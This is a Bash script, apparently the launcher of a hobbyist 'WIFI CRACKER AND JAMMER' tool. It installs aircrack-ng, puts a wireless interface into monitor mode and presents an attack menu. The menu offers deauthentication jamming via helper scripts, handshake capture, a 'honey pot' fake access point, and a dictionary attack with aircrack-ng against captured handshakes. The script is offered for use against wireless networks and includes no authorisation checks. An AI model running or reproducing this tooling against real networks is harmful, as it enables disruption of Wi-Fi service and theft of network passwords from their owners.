RED="\e[31m"
ORANGE="\e[33m"
BLUE="\e[94m"
GREEN="\e[92m"
STOP="\e[0m"
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
sudo apt-get install figlet
sudo apt-get install python3
chmod +x *
clear
#---------------------------------
wifi_symbol(){
    python3 Ban.py
}


animate_text1() {
    text="WIFI CRACKER AND JAMMER 2.0"
    length=${#text}

    for ((i = 0; i < length; i++)); do
        clear
        printf "${BLUE}"
        printf "%s${STOP}\n" "$(figlet -w 200 -f small "${text:0:i}")"
        sleep 0.1
    done

    for ((i = length; i >= 0; i--)); do
        clear
        printf "${BLUE}"
        printf "%s${STOP}\n" "$(figlet -w 200 -f small "${text:0:i}")"
        sleep 0.1
    done
}
animate_text2() {
    text="White Devil-Gs"
    length=${#text}

    for ((i = 0; i < length; i++)); do
        clear
        printf "${BLUE}"
        printf "%s${STOP}\n" "$(figlet -w 200 -f small "${text:0:i}")"
        sleep 0.1
    done

    for ((i = length; i >= 0; i--)); do
        clear
        printf "${BLUE}"
        printf "%s${STOP}\n" "$(figlet -w 200 -f small "${text:0:i}")"
        sleep 0.1
    done
}
#-----main-GS-Functions----
jammer (){
    printf "${ORANGE}"
    echo "Input Your WIFI Name after Monitor Mode---> 
      [You will find it after ${RED}#iwconfig#${ORANGE}]"

    read moname1
    printf "${BLUE}"
    figlet -w 200 -f  small ".                 ..     INFO    ..              ."
    printf "${ORANGE}"
    printf "1. Enter the BSSID and Channel of target on Terminal-2\n"
    printf "2. Run ${RED}#./info.sh#${ORANGE} In the other Terminal2\n"
    printf "3. Simultaneously open the other Termial and then run ${RED}#./jammer.sh#${ORANGE}"
    echo "Press....crtl+c After getting Your Target's MAC-ID or BSSID"
    sleep 3
    airodump-ng $moname1
    gnome-terminal     
}
capture(){
    sudo ./capture.sh
    
}
honey(){
    ./honey_pot.sh
}
crack(){
    printf "${ORANGE}"
    echo "Input the cpature{.cap extention} file path-->"
    read file1
    echo "Input the password file path-->"
    read file2
    sudo aircrack-ng $file1 -w $file2
}
#------------------------------------------
printf "${BLUE}"
animate_text1
clear

printf "${BLUE}"
wifi_symbol
sudo apt-get install aircrack-ng
sleep 2
printf "${ORANGE}"
echo "Input Your WIFI Name before Monitor Mode---> 
      [You will find it after ${RED}#iwconfig#${ORANGE}]"
read moname
sudo airmon-ng start $moname 
clear
printf "${STOP}"
while true; do
    clear
    printf "${GREEN}"
    printf "=================================\n"
    printf "${ORANGE}"
    figlet -w 200 -f small "WHITE DEVIL - GS"
    printf "${BLUE}"
    figlet -w 200 -f  small ".                 ..     wifi_2.0    ..              ."
    printf "${GREEN}"
    printf "=================================\n"
    printf "${STOP}"
    printf "\n${RED}"
    figlet -w 200 -f small "           Options"
    printf "${ORANGE}"
    echo "         -----------------------------------"
    echo "         | ${RED}[${WHITE}01${RED}]${ORANGE}- Jammer                     |"
    echo "         | ${RED}[${WHITE}02${RED}]${ORANGE}- capture Handshake File     |"
    echo "         | ${RED}[${WHITE}03${RED}]${ORANGE}- Honey Pot                  |"
    echo "         | ${RED}[${WHITE}04${RED}]${ORANGE}- Crack password             |"
    echo "         | ${RED}[${WHITE}05${RED}]${ORANGE}- Exit                       |"
    echo "         -----------------------------------"
    printf "${STOP}"
    echo "Select attck--> "
    read choice
    case $choice in

        1) jammer ;;

        2) capture ;;

        3) honey ;;
        
        4) crack;;
        
        5) exit ;;

        *) echo "Invalid option. Please choose again." ;;

    esac
done
